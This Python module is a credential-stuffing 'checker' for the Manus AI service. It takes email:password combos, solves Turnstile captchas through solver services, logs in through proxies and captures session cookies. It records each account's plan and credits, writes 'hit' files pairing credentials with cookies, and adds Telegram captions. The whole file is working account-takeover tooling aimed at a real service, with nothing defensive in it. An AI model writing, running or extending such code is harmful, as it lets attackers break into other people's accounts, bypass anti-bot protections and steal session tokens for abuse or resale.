"""Manus mail-mode checker — email:password login → plan pull → cookie capture.

Same result shape as hotmail msa_fresh (never raises, never crashes bot):

  {"email","password","proxy","mode","status","message","details"}
  status: valid | 2fa | invalid | locked | rate_limit | captcha | error

On valid, details contains plan/planFolder/kind/isPaid, credits,
email/name/userId, cookies{session_id, header, netscape}, loginEndpoint.
"""
from __future__ import annotations

import os
from typing import Any, Dict, Optional

import httpx


def is_paid_plan(plan: str) -> bool:
    """True when the Manus plan is a paid tier (never raises)."""
    try:
        from sites.manus.checker import is_premium_plan

        return bool(is_premium_plan(plan or ""))
    except Exception:
        p = (plan or "").strip().lower()
        return bool(p) and p not in ("free", "basic", "unknown", "n/a", "none", "")


def plan_label(plan: str) -> str:
    """Caption plan line: 'Free' or 'Paid - <Type>'."""
    p = (plan or "").strip() or "Free"
    if is_paid_plan(p):
        return f"Paid - {p.title() if p.islower() else p}"
    return "Free"


def hit_filename(email: str) -> str:
    """Per-hit .txt name, op.py style: local_domain.txt (filesystem-safe)."""
    import re

    local, _, dom = (email or "unknown").partition("@")
    base = f"{local}_{dom}" if dom else local
    safe = re.sub(r"[^\w.\-]+", "_", base).strip("._")[:80] or "hit"
    return f"{safe}.txt"


def format_hit_file(email: str, password: str, details: dict) -> str:
    """One hit file body: mail:pass, plan ABOVE the cookie, then cookie.

    email:password
    Plan: <Free | Paid - Type> | credits: N | tasks: N
    Cookie: session_id=...
    <netscape lines>
    """
    d = details or {}
    cookies = d.get("cookies") or {}
    total = d.get("totalCredits", "?")
    tasks = d.get("tasks", "?")
    lines = [
        f"{email}:{password}",
        f"Plan: {plan_label(str(d.get('plan') or 'Free'))} | credits: {total} | tasks: {tasks}",
        f"Cookie: {cookies.get('header') or ''}",
    ]
    for nl in cookies.get("netscape") or []:
        lines.append(str(nl))
    return "\n".join(lines) + "\n"


def hit_caption(email: str, details: dict) -> str:
    """Per-file Telegram caption: mail, credits no., plan (paid → type)."""
    d = details or {}
    plan = plan_label(str(d.get("plan") or "Free"))
    return (
        f"🧠 <code>{(email or '?')[:64]}</code>\n"
        f"credits: {d.get('totalCredits', '?')}\n"
        f"plan: {plan}"
    )


def write_hit_files(valid: list, dest_dir) -> list:
    """Write one .txt per account. Returns [(path, caption), ...]."""
    from pathlib import Path as _P

    dest = _P(dest_dir)
    try:
        dest.mkdir(parents=True, exist_ok=True)
    except Exception:
        pass
    out = []
    for r in valid or []:
        email = str((r or {}).get("email") or "unknown")
        d = (r or {}).get("details") or {}
        base = hit_filename(email)
        pth = dest / base
        i = 1
        while pth.exists():
            stem = base[:-4] if base.endswith(".txt") else base
            pth = dest / f"{stem}_{i}.txt"
            i += 1
        try:
            pth.write_text(
                format_hit_file(email, str((r or {}).get("password") or ""), d),
                encoding="utf-8")
            out.append((str(pth), hit_caption(email, d)))
        except Exception:
            continue
    return out


def _list_sessions_count(token: str, *, proxy_url: Optional[str] = None,
                         timeout: float = 20.0) -> int:
    """After-login feature: how many tasks/sessions the account holds."""
    try:
        from sites.manus import auth as _auth

        c = _auth.thread_client(proxy_url, timeout)
        mine = False
    except Exception:
        kw: Dict[str, Any] = {
            "timeout": httpx.Timeout(float(timeout), connect=8.0),
            "follow_redirects": True,
            "http2": False,
        }
        if proxy_url:
            kw["proxy"] = proxy_url
        c = httpx.Client(**kw)
        mine = True
    if True:  # (keeps original indentation valid; errors handled by callers)
        r = c.post(
            "https://api.manus.im/session.v1.SessionService/ListSessions",
            json={"limit": 28, "noProject": True, "includeEmptyTasks": True},
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/152.0.0.0",
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": f"Bearer {token}",
                "Connect-Protocol-Version": "1",
                "Origin": "https://manus.im",
                "Referer": "https://manus.im/app",
            },
        )
        if r.status_code != 200:
            return -1
        try:
            d = r.json()
        except Exception:
            return -1
        for key in ("sessions", "items", "tasks", "list"):
            v = d.get(key) if isinstance(d, dict) else None
            if isinstance(v, list):
                if mine:
                    try:
                        c.close()
                    except Exception:
                        pass
                return len(v)
        if mine:
            try:
                c.close()
            except Exception:
                pass
        return 0


def check_session_token(
    token: str,
    email: str = "",
    *,
    proxy_url: Optional[str] = None,
    timeout: float = 40.0,
) -> Dict[str, Any]:
    """Validate a grabbed session key → plan map → cookie grab. Never raises.

    Use with a fresh `token` from LoginByEmail (or `session_id` cookie).
    This is the captcha-free path: no Turnstile needed.
    """
    token = (token or "").strip()
    base: Dict[str, Any] = {
        "email": email.strip() or "unknown",
        "password": "",
        "proxy": proxy_url or "",
        "mode": "proxy" if proxy_url else "proxyless",
        "status": "error",
        "message": "",
        "details": {"engine": "manus_mail", "via": "session_token"},
    }
    if len(token) < 20:
        base.update(status="invalid", message="bad session token")
        return base
    try:
        from sites.manus.cookie_parser import ParsedManusCookie
        from sites.manus import checker as manus_mod
        import asyncio

        cookie = ParsedManusCookie(
            session_token=token,
            raw_cookie=f"session_id={token}",
            email=base["email"],
            session_id=token,
        )
        cookie.all_cookies = [
            {"name": "session_id", "value": token, "domain": ".manus.im", "path": "/"}
        ]
        try:
            res = asyncio.run(manus_mod.check_manus_cookie(cookie))
        except RuntimeError:
            import concurrent.futures

            with concurrent.futures.ThreadPoolExecutor(max_workers=1) as ex:
                res = ex.submit(asyncio.run, manus_mod.check_manus_cookie(cookie)).result()
        rstatus = str(res.get("status") or "error")
        msg = str(res.get("message") or "")
        det = dict(res.get("details") or {})
        try:
            netscape = manus_mod.build_netscape_lines(cookie)
        except Exception:
            netscape = [f".manus.im\tTRUE\t/\tTRUE\t0\tsession_id\t{token}"]
        if det.get("email") and "@" in str(det["email"]):
            base["email"] = str(det["email"])
        base["details"].update(det)
        base["details"]["session_id"] = token
        base["details"]["cookies"] = {
            "session_id": token,
            "header": f"session_id={token}",
            "netscape": netscape,
        }
        try:
            base["details"]["tasks"] = _list_sessions_count(
                token, proxy_url=proxy_url, timeout=min(float(timeout), 20.0))
        except Exception:
            pass
        if det.get("phoneGate"):
            base.update(status="2fa", message="PHONE GATE: needs phone verification, skipping")
        elif rstatus == "valid":
            base.update(status="valid", message=msg[:160] or f"valid · {det.get('plan', 'Free')}")
        elif rstatus == "expired":
            base.update(status="invalid", message="session key expired/revoked — grab a fresh one")
        else:
            base.update(status="error", message=msg[:160] or rstatus)
        return base
    except Exception as e:
        base.update(status="error", message=str(e)[:160])
        return base


def _mask_email(email: str) -> str:
    """aizhar1198@gmail.com -> aiz***@gmail.com (op.py style)."""
    try:
        local, _, dom = (email or "").partition("@")
        if not dom:
            return (email or "")[:6] + "***"
        return (local[:3] + "***@" + dom) if len(local) > 3 else (local + "***@" + dom)
    except Exception:
        return "***"


def check_combo(
    email: str,
    password: str,
    *,
    proxy_url: Optional[str] = None,
    timeout: float = 40.0,
    login_only: bool = False,
    captcha_token: str = "",
    capsolver_key: str = "",
    twocaptcha_key: str = "",
    no_browser: bool = False,
    on_stage=None,
    solver: str = "",
) -> Dict[str, Any]:
    email = (email or "").strip()
    password = (password or "").strip()
    base: Dict[str, Any] = {
        "email": email,
        "password": password,
        "proxy": proxy_url or "",
        "mode": "proxy" if proxy_url else "proxyless",
        "status": "error",
        "message": "",
        "details": {"engine": "manus_mail"},
    }
    if not email or not password or "@" not in email:
        base.update(status="invalid", message="bad combo format")
        return base
    try:
        from sites.manus import auth as manus_auth
    except Exception as e:
        base.update(status="error", message=f"manus auth module missing: {e}"[:160])
        return base

    token_in = (captcha_token or "").strip()
    stage = on_stage or (lambda *a, **k: None)
    if token_in:
        stage(f"[{_mask_email(email)}] captcha token supplied, skipping solver")
    else:
        # Free/keyless solvers (Fahim API) always run; browser/paid keys
        # only when available. solve_turnstile handles no_browser itself.
        import time as _t

        stage(f"[{_mask_email(email)}] solving Turnstile ...")
        _t0 = _t.time()
        token_in = manus_auth.solve_turnstile(
            capsolver_key=capsolver_key or os.environ.get("CAPSOLVER_KEY", ""),
            twocaptcha_key=twocaptcha_key or os.environ.get("TWOCAPTCHA_KEY", ""),
            proxy=proxy_url or "",
            email=email,
            no_browser=no_browser,
            solver=solver or os.environ.get("MANUS_SOLVER", ""),
        )
        _dt = _t.time() - _t0
        stage(f"[{_mask_email(email)}] turnstile "
              f"{f'solved in {_dt:.1f}s' if token_in else 'FAILED (no token)'}")
    stage(f"[{_mask_email(email)}] [1/4] GetUserPlatforms (email check) ...")
    login = manus_auth.email_login(
        email, password, captcha_token=token_in,
        proxy_url=proxy_url, timeout=min(float(timeout), 60.0),
    )
    base["details"].update(login.get("details") or {})
    status = str(login.get("status") or "error")
    if status == "captcha" and not token_in:
        base.update(status="captcha",
                    message="Turnstile unsolved (all solvers failed) — retry or paste --captcha-token")
        return base
    if status != "valid":
        base.update(status=status if status in (
            "invalid", "2fa", "locked", "rate_limit", "captcha") else "error",
            message=str(login.get("message") or status)[:160])
        return base

    token = str(login.get("token") or "")
    base["details"]["session_id"] = token
    base["details"]["loginEndpoint"] = (
        "https://api.manus.im/user.v1.UserAuthPublicService/LoginByEmail")
    if login_only:
        base.update(status="valid", message="login ok")
        return base

    # Plan pull + cookie capture via the proven cookie checker.
    stage(f"[{_mask_email(email)}] [2/4] LoginByEmail ok → [3/4] plan + cookies ...")
    try:
        from sites.manus.cookie_parser import ParsedManusCookie
        from sites.manus import checker as manus_mod
        import asyncio

        jar = {"session_id": token}
        cookie = ParsedManusCookie(
            session_token=token,
            raw_cookie=f"session_id={token}",
            email=email,
            session_id=token,
        )
        cookie.all_cookies = [
            {"name": "session_id", "value": token, "domain": ".manus.im", "path": "/"}
        ]

        def _run_check():
            try:
                return asyncio.run(manus_mod.check_manus_cookie(cookie))
            except RuntimeError:
                import concurrent.futures as _cf2

                with _cf2.ThreadPoolExecutor(max_workers=1) as ex:
                    return ex.submit(asyncio.run, manus_mod.check_manus_cookie(cookie)).result()

        async def _bundle():
            """Plan pull + task count CONCURRENTLY (saves ~2-4s per combo)."""
            check_task = asyncio.ensure_future(manus_mod.check_manus_cookie(cookie))
            sess_task = asyncio.ensure_future(asyncio.to_thread(
                _list_sessions_count, token,
                proxy_url=proxy_url, timeout=min(float(timeout), 20.0)))
            res = await check_task
            try:
                tasks = await sess_task
            except Exception:
                tasks = -1
            return res, tasks

        def _run_bundle():
            try:
                return asyncio.run(_bundle())
            except RuntimeError:
                import concurrent.futures as _cf3

                with _cf3.ThreadPoolExecutor(max_workers=1) as ex:
                    return ex.submit(asyncio.run, _bundle()).result()

        res, _tasks = _run_bundle()
        # Fresh tokens occasionally 401 on first touch (session propagation
        # lag) — one retry after a short sleep before calling it expired.
        if str(res.get("status") or "") == "expired":
            import time as _ts

            stage(f"[{_mask_email(email)}] session warming up — retry plan pull ...")
            _ts.sleep(4)
            try:
                res, _tasks = _run_bundle()
            except Exception:
                pass
        rstatus = str(res.get("status") or "error")
        msg = str(res.get("message") or "")
        det = dict(res.get("details") or {})
        try:
            netscape = manus_mod.build_netscape_lines(cookie)
        except Exception:
            netscape = [f".manus.im\tTRUE\t/\tTRUE\t0\tsession_id\t{token}"]
        base["details"].update(det)
        base["details"]["cookies"] = {
            "session_id": token,
            "header": f"session_id={token}",
            "netscape": netscape,
        }
        # After-login extras: task count (best-effort, never fatal).
        try:
            base["details"]["tasks"] = _list_sessions_count(
                token, proxy_url=proxy_url, timeout=min(float(timeout), 20.0))
        except Exception:
            pass
        if det.get("phoneGate"):
            base.update(status="2fa", message="PHONE GATE: needs phone verification, skipping")
        elif rstatus == "valid":
            base.update(status="valid", message=msg[:160] or f"valid · {det.get('plan', 'Free')}")
        elif rstatus == "expired":
            base.update(status="invalid", message="Manus rejected fresh token")
        else:
            base.update(status="error", message=msg[:160] or rstatus)
        return base
    except Exception as e:
        base.update(status="valid", message="login ok; plan pull failed")
        base["details"]["cookies"] = {"session_id": token, "header": f"session_id={token}", "netscape": []}
        base["details"]["plan_error"] = str(e)[:120]
        return base
